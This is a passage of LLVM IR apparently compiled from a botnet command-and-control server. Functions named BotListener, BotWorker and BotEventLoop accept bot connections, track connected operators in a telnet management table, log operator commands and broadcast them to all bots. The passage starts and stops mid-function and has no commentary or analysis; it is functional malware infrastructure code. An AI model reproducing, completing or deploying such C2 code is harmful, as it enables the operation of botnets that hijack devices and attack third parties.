  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %169, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.82, i64 0, i64 0), i64 61, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %170, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.83, i64 0, i64 0), i64 61, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %171, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.84, i64 0, i64 0), i64 47, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %172, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.85, i64 0, i64 0), i64 40, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %173, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.86, i64 0, i64 0), i64 38, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %174, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.87, i64 0, i64 0), i64 38, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %175, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.88, i64 0, i64 0), i64 46, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %176, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.89, i64 0, i64 0), i64 52, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %177, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.90, i64 0, i64 0), i64 38, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %178, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.91, i64 0, i64 0), i64 35, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %179, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.92, i64 0, i64 0), i64 49, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %180, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.93, i64 0, i64 0), i64 47, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %181, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.94, i64 0, i64 0), i64 49, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %182, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.95, i64 0, i64 0), i64 44, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %183, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.96, i64 0, i64 0), i64 40, i32 1, i1 false)
  %305 = call i64 @strlen(i8* nonnull %159) #9
  %306 = call i64 @send(i32 %47, i8* nonnull %159, i64 %305, i32 16384) #10
  %307 = icmp eq i64 %306, -1
  br i1 %307, label %.loopexit.loopexit, label %308

; <label>:308:                                    ; preds = %303
  %309 = call i64 @strlen(i8* nonnull %160) #9
  %310 = call i64 @send(i32 %47, i8* nonnull %160, i64 %309, i32 16384) #10
  %311 = icmp eq i64 %310, -1
  br i1 %311, label %.loopexit.loopexit, label %312

; <label>:312:                                    ; preds = %308
  %313 = call i64 @strlen(i8* nonnull %161) #9
  %314 = call i64 @send(i32 %47, i8* nonnull %161, i64 %313, i32 16384) #10
  %315 = icmp eq i64 %314, -1
  br i1 %315, label %.loopexit.loopexit, label %316

; <label>:316:                                    ; preds = %312
  %317 = call i64 @strlen(i8* nonnull %162) #9
  %318 = call i64 @send(i32 %47, i8* nonnull %162, i64 %317, i32 16384) #10
  %319 = icmp eq i64 %318, -1
  br i1 %319, label %.loopexit.loopexit, label %320

; <label>:320:                                    ; preds = %316
  %321 = call i64 @strlen(i8* nonnull %163) #9
  %322 = call i64 @send(i32 %47, i8* nonnull %163, i64 %321, i32 16384) #10
  %323 = icmp eq i64 %322, -1
  br i1 %323, label %.loopexit.loopexit, label %324

; <label>:324:                                    ; preds = %320
  %325 = call i64 @strlen(i8* nonnull %164) #9
  %326 = call i64 @send(i32 %47, i8* nonnull %164, i64 %325, i32 16384) #10
  %327 = icmp eq i64 %326, -1
  br i1 %327, label %.loopexit.loopexit, label %328

; <label>:328:                                    ; preds = %324
  %329 = call i64 @strlen(i8* nonnull %165) #9
  %330 = call i64 @send(i32 %47, i8* nonnull %165, i64 %329, i32 16384) #10
  %331 = icmp eq i64 %330, -1
  br i1 %331, label %.loopexit.loopexit, label %332

; <label>:332:                                    ; preds = %328
  %333 = call i64 @strlen(i8* nonnull %166) #9
  %334 = call i64 @send(i32 %47, i8* nonnull %166, i64 %333, i32 16384) #10
  %335 = icmp eq i64 %334, -1
  br i1 %335, label %.loopexit.loopexit, label %336

; <label>:336:                                    ; preds = %332
  %337 = call i64 @strlen(i8* nonnull %167) #9
  %338 = call i64 @send(i32 %47, i8* nonnull %167, i64 %337, i32 16384) #10
  %339 = icmp eq i64 %338, -1
  br i1 %339, label %.loopexit.loopexit, label %340

; <label>:340:                                    ; preds = %336
  %341 = call i64 @strlen(i8* nonnull %168) #9
  %342 = call i64 @send(i32 %47, i8* nonnull %168, i64 %341, i32 16384) #10
  %343 = icmp eq i64 %342, -1
  br i1 %343, label %.loopexit.loopexit, label %344

; <label>:344:                                    ; preds = %340
  %345 = call i64 @strlen(i8* nonnull %169) #9
  %346 = call i64 @send(i32 %47, i8* nonnull %169, i64 %345, i32 16384) #10
  %347 = icmp eq i64 %346, -1
  br i1 %347, label %.loopexit.loopexit, label %348

; <label>:348:                                    ; preds = %344
  %349 = call i64 @strlen(i8* nonnull %170) #9
  %350 = call i64 @send(i32 %47, i8* nonnull %170, i64 %349, i32 16384) #10
  %351 = icmp eq i64 %350, -1
  br i1 %351, label %.loopexit.loopexit, label %352

; <label>:352:                                    ; preds = %348
  %353 = call i64 @strlen(i8* nonnull %171) #9
  %354 = call i64 @send(i32 %47, i8* nonnull %171, i64 %353, i32 16384) #10
  %355 = icmp eq i64 %354, -1
  br i1 %355, label %.loopexit.loopexit, label %356

; <label>:356:                                    ; preds = %352
  %357 = call i64 @strlen(i8* nonnull %172) #9
  %358 = call i64 @send(i32 %47, i8* nonnull %172, i64 %357, i32 16384) #10
  %359 = icmp eq i64 %358, -1
  br i1 %359, label %.loopexit.loopexit, label %360

; <label>:360:                                    ; preds = %356
  %361 = call i64 @strlen(i8* nonnull %173) #9
  %362 = call i64 @send(i32 %47, i8* nonnull %173, i64 %361, i32 16384) #10
  %363 = icmp eq i64 %362, -1
  br i1 %363, label %.loopexit.loopexit, label %364

; <label>:364:                                    ; preds = %360
  %365 = call i64 @strlen(i8* nonnull %174) #9
  %366 = call i64 @send(i32 %47, i8* nonnull %174, i64 %365, i32 16384) #10
  %367 = icmp eq i64 %366, -1
  br i1 %367, label %.loopexit.loopexit, label %368

; <label>:368:                                    ; preds = %364
  %369 = call i64 @strlen(i8* nonnull %175) #9
  %370 = call i64 @send(i32 %47, i8* nonnull %175, i64 %369, i32 16384) #10
  %371 = icmp eq i64 %370, -1
  br i1 %371, label %.loopexit.loopexit, label %372

; <label>:372:                                    ; preds = %368
  %373 = call i64 @strlen(i8* nonnull %176) #9
  %374 = call i64 @send(i32 %47, i8* nonnull %176, i64 %373, i32 16384) #10
  %375 = icmp eq i64 %374, -1
  br i1 %375, label %.loopexit.loopexit, label %376

; <label>:376:                                    ; preds = %372
  %377 = call i64 @strlen(i8* nonnull %177) #9
  %378 = call i64 @send(i32 %47, i8* nonnull %177, i64 %377, i32 16384) #10
  %379 = icmp eq i64 %378, -1
  br i1 %379, label %.loopexit.loopexit, label %380

; <label>:380:                                    ; preds = %376
  %381 = call i64 @strlen(i8* nonnull %178) #9
  %382 = call i64 @send(i32 %47, i8* nonnull %178, i64 %381, i32 16384) #10
  %383 = icmp eq i64 %382, -1
  br i1 %383, label %.loopexit.loopexit, label %384

; <label>:384:                                    ; preds = %380
  %385 = call i64 @strlen(i8* nonnull %179) #9
  %386 = call i64 @send(i32 %47, i8* nonnull %179, i64 %385, i32 16384) #10
  %387 = icmp eq i64 %386, -1
  br i1 %387, label %.loopexit.loopexit, label %388

; <label>:388:                                    ; preds = %384
  %389 = call i64 @strlen(i8* nonnull %180) #9
  %390 = call i64 @send(i32 %47, i8* nonnull %180, i64 %389, i32 16384) #10
  %391 = icmp eq i64 %390, -1
  br i1 %391, label %.loopexit.loopexit, label %392

; <label>:392:                                    ; preds = %388
  %393 = call i64 @strlen(i8* nonnull %181) #9
  %394 = call i64 @send(i32 %47, i8* nonnull %181, i64 %393, i32 16384) #10
  %395 = icmp eq i64 %394, -1
  br i1 %395, label %.loopexit.loopexit, label %396

; <label>:396:                                    ; preds = %392
  %397 = call i64 @strlen(i8* nonnull %182) #9
  %398 = call i64 @send(i32 %47, i8* nonnull %182, i64 %397, i32 16384) #10
  %399 = icmp eq i64 %398, -1
  br i1 %399, label %.loopexit.loopexit, label %400

; <label>:400:                                    ; preds = %396
  %401 = call i64 @strlen(i8* nonnull %183) #9
  %402 = call i64 @send(i32 %47, i8* nonnull %183, i64 %401, i32 16384) #10
  %403 = icmp eq i64 %402, -1
  br i1 %403, label %.loopexit.loopexit, label %404

; <label>:404:                                    ; preds = %400
  %405 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  br label %.backedge

; <label>:406:                                    ; preds = %300
  %407 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.97, i64 0, i64 0)) #9
  %408 = icmp eq i8* %407, null
  br i1 %408, label %413, label %409

; <label>:409:                                    ; preds = %406
  call void @llvm.memset.p0i8.i64(i8* %185, i8 0, i64 2034, i32 2, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %158, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i64 0, i64 0), i64 14, i32 1, i1 false)
  %410 = call i64 @strlen(i8* nonnull %158) #9
  %411 = call i64 @send(i32 %47, i8* nonnull %158, i64 %410, i32 16384) #10
  %412 = icmp eq i64 %411, -1
  br i1 %412, label %.loopexit.loopexit, label %.backedge

; <label>:413:                                    ; preds = %406
  %414 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i64 0, i64 0)) #9
  %415 = icmp eq i8* %414, null
  br i1 %415, label %459, label %416

; <label>:416:                                    ; preds = %413
  call void @llvm.memset.p0i8.i64(i8* %184, i8 0, i64 2037, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %157, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i64 0, i64 0), i64 11, i32 1, i1 false)
  %417 = call i64 @strlen(i8* nonnull %157) #9
  %418 = call i64 @send(i32 %47, i8* nonnull %157, i64 %417, i32 16384) #10
  %419 = icmp eq i64 %418, -1
  br i1 %419, label %.loopexit.loopexit, label %420

; <label>:420:                                    ; preds = %416
  %421 = call i64 @strlen(i8* nonnull %90) #9
  %422 = call i64 @send(i32 %47, i8* nonnull %90, i64 %421, i32 16384) #10
  %423 = icmp eq i64 %422, -1
  br i1 %423, label %.loopexit.loopexit, label %424

; <label>:424:                                    ; preds = %420
  %425 = call i64 @strlen(i8* nonnull %91) #9
  %426 = call i64 @send(i32 %47, i8* nonnull %91, i64 %425, i32 16384) #10
  %427 = icmp eq i64 %426, -1
  br i1 %427, label %.loopexit.loopexit, label %428

; <label>:428:                                    ; preds = %424
  %429 = call i64 @strlen(i8* nonnull %92) #9
  %430 = call i64 @send(i32 %47, i8* nonnull %92, i64 %429, i32 16384) #10
  %431 = icmp eq i64 %430, -1
  br i1 %431, label %.loopexit.loopexit, label %432

; <label>:432:                                    ; preds = %428
  %433 = call i64 @strlen(i8* nonnull %93) #9
  %434 = call i64 @send(i32 %47, i8* nonnull %93, i64 %433, i32 16384) #10
  %435 = icmp eq i64 %434, -1
  br i1 %435, label %.loopexit.loopexit, label %436

; <label>:436:                                    ; preds = %432
  %437 = call i64 @strlen(i8* nonnull %94) #9
  %438 = call i64 @send(i32 %47, i8* nonnull %94, i64 %437, i32 16384) #10
  %439 = icmp eq i64 %438, -1
  br i1 %439, label %.loopexit.loopexit, label %440

; <label>:440:                                    ; preds = %436
  %441 = call i64 @strlen(i8* nonnull %95) #9
  %442 = call i64 @send(i32 %47, i8* nonnull %95, i64 %441, i32 16384) #10
  %443 = icmp eq i64 %442, -1
  br i1 %443, label %.loopexit.loopexit, label %444

; <label>:444:                                    ; preds = %440
  %445 = call i64 @strlen(i8* nonnull %96) #9
  %446 = call i64 @send(i32 %47, i8* nonnull %96, i64 %445, i32 16384) #10
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %.loopexit.loopexit, label %448

; <label>:448:                                    ; preds = %444
  %449 = call i64 @strlen(i8* nonnull %97) #9
  %450 = call i64 @send(i32 %47, i8* nonnull %97, i64 %449, i32 16384) #10
  %451 = icmp eq i64 %450, -1
  br i1 %451, label %.loopexit.loopexit, label %452

; <label>:452:                                    ; preds = %448
  %453 = call i64 @strlen(i8* nonnull %89) #9
  %454 = call i64 @send(i32 %47, i8* nonnull %89, i64 %453, i32 16384) #10
  %455 = icmp eq i64 %454, -1
  br i1 %455, label %.loopexit.loopexit, label %456

; <label>:456:                                    ; preds = %452
  %457 = call i64 @send(i32 %47, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i64 0, i64 0), i64 12, i32 16384) #10
  %458 = icmp eq i64 %457, -1
  br i1 %458, label %.loopexit.loopexit, label %.backedge

; <label>:459:                                    ; preds = %413
  %460 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i64 0, i64 0)) #9
  %461 = icmp eq i8* %460, null
  br i1 %461, label %470, label %462

; <label>:462:                                    ; preds = %459
  %463 = getelementptr inbounds [2048 x i8], [2048 x i8]* %43, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %463, i8 0, i64 2048, i32 16, i1 false)
  %464 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %463, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i64 0, i64 0), i8* %74) #10
  %465 = call i64 @strlen(i8* nonnull %463) #9
  %466 = call i64 @send(i32 %47, i8* nonnull %463, i64 %465, i32 16384) #10
  %467 = icmp eq i64 %466, -1
  br i1 %467, label %.loopexit, label %468

; <label>:468:                                    ; preds = %462
  %469 = call i32 @sleep(i32 5) #10
  br label %.loopexit

; <label>:470:                                    ; preds = %459
  call void @trim(i8* nonnull %50)
  %471 = call i64 @send(i32 %47, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.103, i64 0, i64 0), i64 11, i32 16384) #10
  %472 = icmp eq i64 %471, -1
  br i1 %472, label %.loopexit.loopexit, label %473

; <label>:473:                                    ; preds = %470
  %474 = call i64 @strlen(i8* nonnull %50) #9
  %475 = icmp eq i64 %474, 0
  br i1 %475, label %.backedge, label %476

; <label>:476:                                    ; preds = %473
  %477 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i64 0, i64 0), i8* %74, i8* nonnull %50)
  %478 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.105, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i64 0, i64 0))
  %479 = call i64 @time(i64* null) #10
  store i64 %479, i64* %44, align 8
  %480 = call %struct.tm* @gmtime(i64* nonnull %44) #10
  %481 = call i64 @strftime(i8* nonnull %156, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i64 0, i64 0), %struct.tm* %480) #10
  %482 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %478, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i64 0, i64 0), i8* nonnull %156, i8* %74, i8* nonnull %50)
  %483 = call i32 @fclose(%struct._IO_FILE* %478)
  call void @broadcast(i8* nonnull %50, i32 %47, i8* %74)
  call void @llvm.memset.p0i8.i64(i8* nonnull %50, i8 0, i64 2048, i32 16, i1 false)
  br label %.backedge

.loopexit.loopexit:                               ; preds = %.backedge, %470, %456, %452, %448, %444, %440, %436, %432, %428, %424, %420, %416, %409, %400, %396, %392, %388, %384, %380, %376, %372, %368, %364, %360, %356, %352, %348, %344, %340, %336, %332, %328, %324, %320, %316, %312, %308, %303
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %150, %462, %147, %143, %139, %135, %131, %127, %123, %119, %115, %87, %108, %105, %80, %77, %67, %._crit_edge, %468, %113
  %sext = shl i64 %46, 32
  %484 = ashr exact i64 %sext, 32
  %485 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %484, i32 0
  store i32 0, i32* %485, align 4
  %486 = call i32 @close(i32 %47) #10
  %487 = load volatile i32, i32* @OperatorsConnected, align 4
  %488 = add nsw i32 %487, -1
  store volatile i32 %488, i32* @OperatorsConnected, align 4
  br label %.loopexit95

.loopexit95.loopexit:                             ; preds = %189, %199, %209, %216
  br label %.loopexit95

.loopexit95:                                      ; preds = %.loopexit95.loopexit, %.loopexit
  ret i8* null
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fgetc(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @rewind(%struct._IO_FILE* nocapture) local_unnamed_addr #3

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) local_unnamed_addr #3

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @BotListener(i32) #5 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca i64, align 8
  %6 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  %7 = icmp slt i32 %6, 0
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %1
  tail call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i64 0, i64 0)) #12
  br label %9

; <label>:9:                                      ; preds = %8, %1
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 3, i64 0
  %11 = bitcast i8* %10 to i64*
  store i64 0, i64* %11, align 4
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  store i32 0, i32* %13, align 4
  %14 = trunc i32 %0 to i16
  %15 = tail call zeroext i16 @htons(i16 zeroext %14) #11
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %15, i16* %16, align 2
  %17 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %18 = call i32 @bind(i32 %6, %struct.sockaddr* nonnull %17, i32 16) #10
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %9
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.110, i64 0, i64 0)) #12
  br label %21

; <label>:21:                                     ; preds = %20, %9
  %22 = call i32 @listen(i32 %6, i32 5) #10
  store i32 16, i32* %2, align 4
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %24

; <label>:24:                                     ; preds = %28, %21
  %25 = call i32 @accept(i32 %6, %struct.sockaddr* nonnull %23, i32* nonnull %2) #10
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %24
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i64 0, i64 0)) #12
  br label %28

; <label>:28:                                     ; preds = %27, %24
  %29 = sext i32 %25 to i64
  %30 = inttoptr i64 %29 to i8*
  %31 = call i32 @pthread_create(i64* nonnull %5, %union.pthread_attr_t* null, i8* (i8*)* nonnull @BotWorker, i8* %30) #10
  br label %24
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readonly, i8** nocapture readnone) local_unnamed_addr #5 {
  %4 = alloca %struct.epoll_event, align 4
  %5 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #10
  %6 = icmp eq i32 %0, 4
  br i1 %6, label %11, label %7

; <label>:7:                                      ; preds = %3
  %8 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %9 = load i8*, i8** %1, align 8
  %10 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %8, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.112, i64 0, i64 0), i8* %9) #12
  tail call void @exit(i32 1) #13
  unreachable

; <label>:11:                                     ; preds = %3
  %12 = getelementptr inbounds i8*, i8** %1, i64 3
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 @atoi(i8* %13) #9
  %15 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.114, i64 0, i64 0))
  store %struct._IO_FILE* %15, %struct._IO_FILE** @telFD, align 8
  %16 = getelementptr inbounds i8*, i8** %1, i64 2
  %17 = load i8*, i8** %16, align 8
  %18 = tail call i32 @atoi(i8* %17) #9
  %19 = getelementptr inbounds i8*, i8** %1, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = tail call fastcc i32 @create_and_bind(i8* %20)
  store volatile i32 %21, i32* @listenFD, align 4
  %22 = load volatile i32, i32* @listenFD, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %11
  tail call void @abort() #13
  unreachable

; <label>:25:                                     ; preds = %11
  %26 = load volatile i32, i32* @listenFD, align 4
  %27 = tail call fastcc i32 @make_socket_non_blocking(i32 %26)
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %25
  tail call void @abort() #13
  unreachable

; <label>:30:                                     ; preds = %25
  %31 = load volatile i32, i32* @listenFD, align 4
  %32 = tail call i32 @listen(i32 %31, i32 128) #10
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  tail call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.115, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:35:                                     ; preds = %30
  %36 = tail call i32 @epoll_create1(i32 0) #10
  store volatile i32 %36, i32* @epollFD, align 4
  %37 = load volatile i32, i32* @epollFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %35
  tail call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.116, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:40:                                     ; preds = %35
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 1
  %43 = bitcast %union.epoll_data* %42 to i32*
  store i32 %41, i32* %43, align 4
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 0
  store i32 -2147483647, i32* %44, align 4
  %45 = load volatile i32, i32* @epollFD, align 4
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = call i32 @epoll_ctl(i32 %45, i32 1, i32 %46, %struct.epoll_event* nonnull %4) #10
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %40
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0)) #12
  call void @abort() #13
  unreachable

; <label>:50:                                     ; preds = %40
  %51 = add nsw i32 %18, 2
  %52 = zext i32 %51 to i64
  %53 = alloca i64, i64 %52, align 16
  %54 = icmp eq i32 %18, 0
  br i1 %54, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %50
  %55 = sext i32 %18 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %55, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %56 = getelementptr inbounds i64, i64* %53, i64 %indvars.iv
  %57 = call i32 @pthread_create(i64* %56, %union.pthread_attr_t* null, i8* (i8*)* nonnull @BotEventLoop, i8* null) #10
  %58 = trunc i64 %indvars.iv.next to i32
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %50
  %60 = sext i32 %14 to i64
  %61 = inttoptr i64 %60 to i8*
  %62 = call i32 @pthread_create(i64* nonnull %53, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %61) #10
  br label %63

; <label>:63:                                     ; preds = %63, %._crit_edge
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i64 0, i64 0))
  %64 = call i32 @sleep(i32 60) #10
  br label %63
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #8

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @create_and_bind(i8*) unnamed_addr #0 {
  %2 = alloca %struct.addrinfo, align 8
  %3 = alloca %struct.addrinfo*, align 8
  %4 = alloca i32, align 4
  %5 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 2
  %6 = bitcast %struct.addrinfo* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %6, i8 0, i64 48, i32 8, i1 false)
  store i32 1, i32* %5, align 8
  %7 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 0
  store i32 1, i32* %7, align 8
  %8 = call i32 @getaddrinfo(i8* null, i8* %0, %struct.addrinfo* nonnull %2, %struct.addrinfo** nonnull %3) #10
  %9 = icmp eq i32 %8, 0
  br i1 %9, label %.preheader, label %12

.preheader:                                       ; preds = %1
  %.01719 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  %10 = icmp eq %struct.addrinfo* %.01719, null
  br i1 %10, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %11 = bitcast i32* %4 to i8*
  br label %16

; <label>:12:                                     ; preds = %1
  %13 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %14 = call i8* @gai_strerror(i32 %8) #10
  %15 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %13, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.119, i64 0, i64 0), i8* %14) #12
  br label %45

; <label>:16:                                     ; preds = %.lr.ph, %38
  %.01720 = phi %struct.addrinfo* [ %.01719, %.lr.ph ], [ %.017, %38 ]
  %17 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 1
  %18 = load i32, i32* %17, align 4
  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 2
  %20 = load i32, i32* %19, align 8
  %21 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 3
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @socket(i32 %18, i32 %20, i32 %22) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %38, label %25

; <label>:25:                                     ; preds = %16
  store i32 1, i32* %4, align 4
  %26 = call i32 @setsockopt(i32 %23, i32 1, i32 2, i8* nonnull %11, i32 4) #10
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i64 0, i64 0)) #12
  br label %29

; <label>:29:                                     ; preds = %28, %25
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 5
  %31 = load %struct.sockaddr*, %struct.sockaddr** %30, align 8
